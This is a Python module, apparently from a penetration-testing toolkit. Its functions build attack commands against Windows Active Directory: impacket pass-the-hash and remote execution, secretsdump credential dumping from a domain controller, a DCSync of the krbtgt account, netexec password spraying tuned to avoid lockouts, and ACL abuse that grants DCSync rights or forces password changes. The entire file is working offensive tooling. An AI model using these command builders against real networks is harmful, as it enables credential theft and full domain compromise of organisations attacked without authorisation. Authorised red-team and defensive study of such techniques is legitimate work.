"""Remote command execution and credential abuse command builders."""

from __future__ import annotations

__all__ = [
    "pass_the_hash_command",
    "smb_exec_command",
    "secretsdump_command",
    "dcsync_command",
    "spray_command",
    "acl_abuse_commands",
]


def pass_the_hash_command(
    target: str,
    username: str,
    nt_hash: str,
    domain: str = ".",
    *,
    command: str = "whoami /all",
    method: str = "wmiexec",
) -> str:
    """Build a Pass-the-Hash command using impacket.

    Args:
        method: ``wmiexec`` | ``psexec`` | ``smbexec`` | ``atexec``.
    """
    return f"{method}.py -hashes :{nt_hash} {domain}/{username}@{target} '{command}'"


def smb_exec_command(
    target: str,
    username: str,
    password: str,
    domain: str = ".",
    *,
    command: str = "whoami /all",
    method: str = "wmiexec",
) -> str:
    """Build an impacket SMB command execution string.

    Args:
        method: ``wmiexec`` | ``psexec`` | ``smbexec``.
    """
    return f"{method}.py {domain}/{username}:'{password}'@{target} '{command}'"


def secretsdump_command(
    target: str,
    username: str,
    password: str,
    domain: str = ".",
    *,
    just_dc_ntlm: bool = True,
    output: str = "dump",
) -> str:
    """Build an impacket secretsdump command to dump credentials from a DC."""
    flags = "-just-dc-ntlm" if just_dc_ntlm else "-just-dc"
    return (
        f"secretsdump.py {domain}/{username}:'{password}'@{target} "
        f"{flags} -outputfile {output}"
    )


def dcsync_command(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    target_user: str = "krbtgt",
) -> str:
    """Build an impacket secretsdump DCSync command for a specific account."""
    return (
        f"secretsdump.py -just-dc-user {target_user} "
        f"{domain}/{username}:'{password}'@{dc_ip}"
    )


def spray_command(
    dc_ip: str,
    domain: str,
    password: str,
    users_file: str,
    *,
    protocol: str = "smb",
    jitter_s: int = 0,
) -> str:
    """Build a netexec password spraying command.

    Args:
        protocol: ``smb`` | ``ldap`` | ``winrm`` | ``ssh`` | ``rdp`` | ``mssql``.
        jitter_s: Random delay (seconds) between attempts to avoid lockouts.
    """
    jitter_flag = f"--jitter {jitter_s}" if jitter_s else ""
    return (
        f"netexec {protocol} {dc_ip} -u {users_file} -p '{password}' "
        f"-d {domain} --continue-on-success {jitter_flag}"
    ).strip()


def acl_abuse_commands(
    domain: str,
    attacker_user: str,
    attacker_pass: str,
    target_user: str,
    dc_ip: str,
    *,
    abuse_type: str = "genericwrite",
) -> list[str]:
    """Return commands to abuse common AD ACL misconfigurations.

    Args:
        abuse_type: ``genericwrite`` (targeted kerberoast) |
            ``writedacl`` (grant DCSync rights) |
            ``forcechangepassword``.
    """
    abuses: dict[str, list[str]] = {
        "genericwrite": [
            (
                f"targetedKerberoast.py -v -d {domain} -u {attacker_user} -p '{attacker_pass}' "
                f"--dc-ip {dc_ip} --only-abuse"
            ),
        ],
        "writedacl": [
            (
                f"dacledit.py -action write -rights DCSync -principal {attacker_user} "
                f"-target {domain} {domain}/{attacker_user}:'{attacker_pass}' -dc-ip {dc_ip}"
            ),
            (
                f"secretsdump.py {domain}/{attacker_user}:'{attacker_pass}'@{dc_ip} "
                f"-just-dc-ntlm"
            ),
        ],
        "forcechangepassword": [
            (
                f"net rpc password {target_user} newpass123! "
                f"-U {domain}/{attacker_user}%'{attacker_pass}' -S {dc_ip}"
            ),
        ],
    }
    return abuses.get(abuse_type, abuses["genericwrite"])
